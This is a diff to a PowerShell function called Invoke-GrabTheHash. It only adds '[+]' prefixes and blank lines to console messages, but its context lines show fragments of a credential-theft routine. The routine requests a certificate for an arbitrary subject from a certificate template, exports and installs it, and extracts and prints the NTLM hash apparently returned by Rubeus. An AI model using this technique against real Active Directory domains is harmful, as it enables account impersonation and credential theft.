@@ -159,7 +159,8 @@ function Invoke-GrabTheHash
 
 	if($PSBoundParameters['Debug']){$DebugPreference = "Continue"}
 	
-	Write-Host "Requesting certificate with subject $CN"
+	Write-Host "[+] Requesting certificate with subject $CN"
+ 	Write-Host ""
 	
 	$file = @"
 [NewRequest]
@@ -231,7 +232,8 @@ CertificateTemplate = "$TemplateName"
 		$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)
 
 		$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
-		Write-Host "Certificate successfully exported to $CN.pfx"
+		Write-Host "[+] Certificate successfully exported to $CN.pfx"
+  		Write-Host ""
 		
 		$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')
 		$certstore.Open('ReadWrite')
@@ -253,7 +255,7 @@ CertificateTemplate = "$TemplateName"
 	
 	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
 		$ntlmValue = $Matches[1]
-		Write-Host "$CN NTLM hash: $ntlmValue"
+		Write-Host "[+] $CN NTLM hash: $ntlmValue"
 		Write-Host ""
 	}
 }
